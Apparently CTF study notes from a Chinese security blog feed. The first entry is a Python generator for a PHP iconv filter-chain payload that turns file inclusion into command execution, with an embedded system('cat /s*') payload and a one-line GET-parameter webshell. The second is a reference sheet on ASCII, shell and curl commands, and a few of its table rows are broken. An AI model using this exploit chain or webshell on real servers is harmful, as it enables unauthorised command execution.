<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#&lt;?=`$_GET[0]`;;?&gt;</span></span><br><span class="line">base64_payload = <span class="string">&quot;PD9waHAgc3lzdGVtKCJjYXQgL3MqIik7Ozs7Pz4&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;/&#x27;</span> : <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span> : <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span> : <span class="string">&#x27;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span> : <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3&#x27;</span> : <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span> : <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;5&#x27;</span> : <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;6&#x27;</span> : <span class="string">&#x27;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span> : <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span> : <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span> : <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span> : <span class="string">&#x27;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span> : <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span> : <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span> : <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;E&#x27;</span> : <span class="string">&#x27;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;F&#x27;</span> : <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;G&#x27;</span> : <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;H&#x27;</span> : <span class="string">&#x27;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;I&#x27;</span> : <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;J&#x27;</span> : <span class="string">&#x27;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;K&#x27;</span> : <span class="string">&#x27;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;L&#x27;</span> : <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;M&#x27;</span> : <span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;N&#x27;</span> : <span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;O&#x27;</span> : <span class="string">&#x27;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span> : <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Q&#x27;</span> : <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span> : <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;S&#x27;</span> : <span class="string">&#x27;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;T&#x27;</span> : <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span> : <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span> : <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span> : <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X&#x27;</span> : <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span> : <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Z&#x27;</span> : <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span> : <span class="string">&#x27;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span> : <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span> : <span class="string">&#x27;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span> : <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;e&#x27;</span> : <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span> : <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;g&#x27;</span> : <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;h&#x27;</span> : <span class="string">&#x27;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;i&#x27;</span> : <span class="string">&#x27;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;j&#x27;</span> : <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;k&#x27;</span> : <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;l&#x27;</span> : <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;m&#x27;</span> : <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span> : <span class="string">&#x27;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span> : <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;p&#x27;</span> : <span class="string">&#x27;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span> : <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;r&#x27;</span> : <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span> : <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;t&#x27;</span> : <span class="string">&#x27;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;u&#x27;</span> : <span class="string">&#x27;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;v&#x27;</span> : <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO_6937-2:1983.R9|convert.iconv.OSF00010005.IBM-932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;w&#x27;</span> : <span class="string">&#x27;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;x&#x27;</span> : <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;y&#x27;</span> : <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span> : <span class="string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate some garbage base64</span></span><br><span class="line">filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> base64_payload[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line">filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=/etc/passwd&quot;</span>   <span class="comment">#1.php改成对的文件/etc/passwd</span></span><br><span class="line"><span class="built_in">print</span>(final_payload)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透学习</category>
        <category>ctfshow</category>
      </categories>
  </entry>
  <entry>
    <title>常识</title>
    <url>/2025/10/12/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/ctfshow/%E5%B8%B8%E8%AF%86/</url>
    <content><![CDATA[<h2 id="1ascii码"><a class="markdownIt-Anchor" href="#1ascii码"></a> 1.ascii码:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[32, 128)   ---常见符号</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>类型</th>
<th>范围</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>控制字符</td>
<td>0~31</td>
<td>不可见（如回车、换行）</td>
</tr>
<tr>
<td>可打印字符</td>
<td><strong>32~126</strong></td>
<td>常见字符，CTF爆破主力</td>
</tr>
<tr>
<td>删除符</td>
<td>127</td>
<td><code>DEL</code> 控制符</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>字符</th>
<th>ASCII</th>
<th>十六进制</th>
<th>用途说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>' '</code>（空格）</td>
<td>32</td>
<td><code>0x20</code></td>
<td>SQL关键词分隔</td>
</tr>
<tr>
<td><code>'!'</code></td>
<td>33</td>
<td><code>0x21</code></td>
<td>特殊字符绕过</td>
</tr>
<tr>
<td><code>'&quot;'</code>（双引号）</td>
<td>34</td>
<td><code>0x22</code></td>
<td>字符串边界，需转义</td>
</tr>
<tr>
<td><code>'#'</code></td>
<td>35</td>
<td><code>0x23</code></td>
<td>注释符（MySQL）</td>
</tr>
<tr>
<td><code>'%'</code></td>
<td>37</td>
<td><code>0x25</code></td>
<td>通配符（like中）</td>
</tr>
<tr>
<td><code>'\''</code>（单引号）</td>
<td>39</td>
<td><code>0x27</code></td>
<td>SQL字符串边界，注入关键符号</td>
</tr>
<tr>
<td><code>'('</code></td>
<td>40</td>
<td><code>0x28</code></td>
<td>表达式开始</td>
</tr>
<tr>
<td><code>')'</code></td>
<td>41</td>
<td><code>0x29</code></td>
<td>表达式结束</td>
</tr>
<tr>
<td><code>'*'</code></td>
<td>42</td>
<td><code>0x2a</code></td>
<td>通配符，如 <code>SELECT *</code></td>
</tr>
<tr>
<td><code>'+'</code></td>
<td>43</td>
<td><code>0x2b</code></td>
<td>加法/字符串拼接</td>
</tr>
<tr>
<td><code>','</code></td>
<td>44</td>
<td><code>0x2c</code></td>
<td>多参数分隔</td>
</tr>
<tr>
<td><code>'-'</code></td>
<td>45</td>
<td><code>0x2d</code></td>
<td>减号/注释开始（–）</td>
</tr>
<tr>
<td><code>'.'</code></td>
<td>46</td>
<td><code>0x2e</code></td>
<td>表.字段结构表示</td>
</tr>
<tr>
<td><code>'/'</code></td>
<td>47</td>
<td><code>0x2f</code></td>
<td>注释符（<code>/*!</code>）或路径</td>
</tr>
<tr>
<td><code>'0' ~ '9'</code></td>
<td>48~57</td>
<td><code>0x30</code> ~ <code>0x39</code></td>
<td>数字字符，布尔比较对象</td>
</tr>
<tr>
<td><code>':'</code></td>
<td>58</td>
<td><code>0x3a</code></td>
<td>URL 参数分隔、端口符号</td>
</tr>
<tr>
<td><code>';'</code></td>
<td>59</td>
<td><code>0x3b</code></td>
<td>SQL语句结束符，注入关键符号</td>
</tr>
<tr>
<td><code>'&lt;'</code></td>
<td>60</td>
<td><code>0x3c</code></td>
<td>HTML标签、比较符</td>
</tr>
<tr>
<td><code>'='</code></td>
<td>61</td>
<td><code>0x3d</code></td>
<td>判断条件</td>
</tr>
<tr>
<td><code>'&gt;'</code></td>
<td>62</td>
<td><code>0x3e</code></td>
<td>HTML标签、比较符</td>
</tr>
<tr>
<td><code>'?'</code></td>
<td>63</td>
<td><code>0x3f</code></td>
<td>GET 参数标志位</td>
</tr>
<tr>
<td><code>'A' ~ 'Z'</code></td>
<td>65~90</td>
<td><code>0x41</code> ~ <code>0x5A</code></td>
<td>大写字母，常用于FLAG或表字段</td>
</tr>
<tr>
<td><code>'a' ~ 'z'</code></td>
<td>97~122</td>
<td><code>0x61</code> ~ <code>0x7A</code></td>
<td>小写字母，常用于flag爆破</td>
</tr>
<tr>
<td><code>'&#123;'</code></td>
<td>123</td>
<td><code>0x7b</code></td>
<td>FLAG 开始（如 ctfshow{）</td>
</tr>
<tr>
<td><code>'&#125;'</code></td>
<td>125</td>
<td><code>0x7d</code></td>
<td>FLAG 结束</td>
</tr>
<tr>
<td>`’</td>
<td>'`</td>
<td>124</td>
<td><code>0x7c</code></td>
</tr>
<tr>
<td><code>'~'</code></td>
<td>126</td>
<td><code>0x7e</code></td>
<td>绕过中用</td>
</tr>
<tr>
<td><code>'\x00'</code></td>
<td>0</td>
<td><code>0x00</code></td>
<td>空字节，常用于绕过终止</td>
</tr>
</tbody>
</table>
<h3 id="python中ascii和字母互转"><a class="markdownIt-Anchor" href="#python中ascii和字母互转"></a> python中ascii和字母互转;</h3>
<table>
<thead>
<tr>
<th>函数</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>chr(ASCII值)</code></td>
<td>把 ASCII 数转成字符</td>
</tr>
<tr>
<td><code>ord(字符)</code></td>
<td>把字符转成 ASCII 数</td>
</tr>
</tbody>
</table>
<h2 id="2windows中cmd与linxu命令的区别"><a class="markdownIt-Anchor" href="#2windows中cmd与linxu命令的区别"></a> 2.windows中cmd与linxu命令的区别:</h2>
<h3 id="清理命令clear"><a class="markdownIt-Anchor" href="#清理命令clear"></a> 清理命令(clear):</h3>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cls</span>   --<span class="built_in">cmd</span>命令</span><br><span class="line">clear  --linxu命令</span><br></pre></td></tr></table></figure>
<h3 id="端口查看"><a class="markdownIt-Anchor" href="#端口查看"></a> 端口查看:</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ss -ltnp | grep :80      ---linxu</span><br><span class="line">netstat -ano | findstr &quot;:80&quot;   ---windows</span><br></pre></td></tr></table></figure>
<h3 id="进程查看"><a class="markdownIt-Anchor" href="#进程查看"></a> 进程查看:</h3>
<table>
<thead>
<tr>
<th>功能/目的</th>
<th>Linux 命令</th>
<th>Windows 命令</th>
<th>说明说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>查看所有进程</td>
<td><code>ps aux</code></td>
<td><code>tasklist</code></td>
<td>显示所有进程</td>
</tr>
<tr>
<td>查看特定进程</td>
<td>`ps -ef</td>
<td>grep 进程名<code>或</code>pgrep`</td>
<td>`tasklist</td>
</tr>
<tr>
<td>查看指定 PID 信息</td>
<td><code>ps -p PID -o pid,cmd,%mem,%cpu</code></td>
<td><code>tasklist /fi &quot;PID eq 1234&quot;</code></td>
<td>查看进程资源使用情况</td>
</tr>
<tr>
<td>查看进程层级结构</td>
<td><code>pstree</code></td>
<td><code>tasklist /v</code>（结构较弱）</td>
<td>Linux 提供更清晰的父子进程层级</td>
</tr>
<tr>
<td>实时查看进程状态</td>
<td><code>top</code> / <code>htop</code>（需安装）</td>
<td><code>tasklist</code>（不实时） / <code>resmon</code> / <code>taskmgr</code></td>
<td>Linux 更灵活，支持排序/过滤等交互式操作</td>
</tr>
<tr>
<td>杀死进程</td>
<td><code>kill -9 PID</code></td>
<td><code>taskkill /PID &lt;pid&gt; /F</code></td>
<td>强制结束进程</td>
</tr>
<tr>
<td>查看进程打开文件</td>
<td><code>lsof -p &lt;PID&gt;</code></td>
<td>无直接命令（需第三方工具）</td>
<td>仅 Linux 原生命令支持</td>
</tr>
<tr>
<td>查看进程监听端口</td>
<td><code>lsof -i</code> / <code>ss -lptn</code></td>
<td><code>netstat -ano</code> + <code>tasklist</code></td>
<td>Linux 更直接，Windows 需组合命令</td>
</tr>
</tbody>
</table>
<h3 id="curl命令"><a class="markdownIt-Anchor" href="#curl命令"></a> curl命令:</h3>
<table>
<thead>
<tr>
<th>类型</th>
<th>示例命令</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>GET 请求</strong></td>
<td><code>curl http://localhost:8080/hello</code></td>
<td>发起简单的 GET 请求</td>
</tr>
<tr>
<td><strong>POST 表单</strong></td>
<td><code>curl -X POST -d &quot;name=wan&amp;age=18&quot; http://localhost:8080/form</code></td>
<td><code>-d</code> 表示 form 表单数据，默认 <code>application/x-www-form-urlencoded</code></td>
</tr>
<tr>
<td><strong>POST JSON</strong></td>
<td><code>curl -X POST -H &quot;Content-Type: application/json&quot; -d '&#123;&quot;name&quot;:&quot;wan&quot;,&quot;age&quot;:18&#125;' http://localhost:8080/json</code></td>
<td><code>-H</code> 指定请求头，发送 JSON 数据</td>
</tr>
<tr>
<td><strong>添加请求头</strong></td>
<td><code>curl -H &quot;Authorization: Bearer TOKEN&quot; http://localhost:8080/api</code></td>
<td>模拟登录认证等，常用于 JWT</td>
</tr>
<tr>
<td><strong>携带 Cookie</strong></td>
<td><code>curl --cookie &quot;sessionid=abc123&quot; http://localhost:8080/auth</code></td>
<td>用于模拟浏览器 session</td>
</tr>
<tr>
<td><strong>响应输出控制</strong></td>
<td><code>curl -i</code>（输出响应头）<code>curl -v</code>（详细调试信息）</td>
<td><code>-i</code> 显示响应头，<code>-v</code> 打印过程</td>
</tr>
<tr>
<td><strong>上传文件</strong></td>
<td><code>curl -F &quot;file=@test.jpg&quot; http://localhost:8080/upload</code></td>
<td>用于 <code>multipart/form-data</code> 文件上传</td>
</tr>
<tr>
<td><strong>设置代理</strong></td>
<td><code>curl -x 127.0.0.1:7890 http://example.com</code></td>
<td>使用 HTTP 代理发送请求</td>
</tr>
<tr>
<td><strong>保存响应</strong></td>
<td><code>curl -o out.txt http://localhost:8080/data</code></td>
<td>将响应保存至文件中</td>
</tr>
<tr>
<td><strong>禁止证书校验</strong></td>
<td><code>curl -k https://localhost:8443</code></td>
<td>用于测试自签名 HTTPS 接口</td>
</tr>
</tbody>
</table>
<h2 id="4windows命令"><a class="markdownIt-Anchor" href="#4windows命令"></a> 4.windows命令:</h2>
<h3 id="1chcp更改代码页"><a class="markdownIt-Anchor" href="#1chcp更改代码页"></a> 1.chcp(更改代码页)</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">65001——UTF-8</span><br><span class="line">936——简体中文</span><br><span class="line">950——繁体中文</span><br><span class="line">437——美国/加拿大英语</span><br><span class="line">932——日文</span><br><span class="line">949——韩文</span><br><span class="line">866——俄文</span><br></pre></td></tr></table></figure>
<h3 id="2-使用代理"><a class="markdownIt-Anchor" href="#2-使用代理"></a> 2. 使用代理:</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">临时设置:</span><br><span class="line">set http_proxy=http://127.0.0.1:7890</span><br><span class="line">set https_proxy=http://127.0.0.1:7890</span><br></pre></td></tr></table></figure>
<h2 id="5linxu命令"><a class="markdownIt-Anchor" href="#5linxu命令"></a> 5.linxu命令:</h2>
<h3 id="1创建目录"><a class="markdownIt-Anchor" href="#1创建目录"></a> 1.创建目录:</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir     -p:创建多级目录</span><br></pre></td></tr></table></figure>
<h3 id="2解压gz文件"><a class="markdownIt-Anchor" href="#2解压gz文件"></a> 2.解压.gz文件:</h3>
<table>
<thead>
<tr>
<th>命令</th>
<th>解压后保留 <code>.gz</code> 吗？</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>gunzip file.gz</code></td>
<td>❌ 不保留</td>
<td>最常用</td>
</tr>
<tr>
<td><code>gzip -d file.gz</code></td>
<td>❌ 不保留</td>
<td>与 <code>gunzip</code> 等效</td>
</tr>
<tr>
<td><code>gzip -dk file.gz</code></td>
<td>✅ 保留</td>
<td><code>-k</code> 表示保留原文件</td>
</tr>
<tr>
<td><code>zcat file.gz</code></td>
<td>✅ 不解压，仅查看</td>
<td>快速查看</td>
</tr>
</tbody>
</table>
<h3 id="3tmux会话"><a class="markdownIt-Anchor" href="#3tmux会话"></a> 3.tmux会话</h3>
<table>
<thead>
<tr>
<th>动作</th>
<th>命令行</th>
<th>键盘组合</th>
</tr>
</thead>
<tbody>
<tr>
<td>新建会话</td>
<td><code>tmux new -s &lt;name&gt;</code></td>
<td>—</td>
</tr>
<tr>
<td>列出会话</td>
<td><code>tmux ls</code></td>
<td><strong>Ctrl-b s</strong></td>
</tr>
<tr>
<td>连接会话</td>
<td><code>tmux attach -t &lt;name&gt;</code></td>
<td><strong>Ctrl-b (<code>(</code> / <code>)</code>)</strong> ⇄ 上/下一个会话</td>
</tr>
<tr>
<td>脱离会话</td>
<td>—</td>
<td><strong>Ctrl-b d</strong> （<em>detach</em>）</td>
</tr>
<tr>
<td>结束会话</td>
<td><code>tmux kill-session -t &lt;name&gt;</code></td>
<td><strong>Ctrl-b &amp;</strong>（结束当前会话）</td>
</tr>
</tbody>
</table>
<h3 id="4base64"><a class="markdownIt-Anchor" href="#4base64"></a> 4.base64:</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base64 [OPTION] [FILE]</span><br><span class="line">解码:</span><br><span class="line">    base64 -d</span><br><span class="line">编码:</span><br><span class="line">    base64</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<h3 id="5软连接"><a class="markdownIt-Anchor" href="#5软连接"></a> 5.软连接:</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s [目标文件或目录] [链接文件名]</span><br></pre></td></tr></table></figure>
<h2 id="6bash"><a class="markdownIt-Anchor" href="#6bash"></a> 6.bash:</h2>
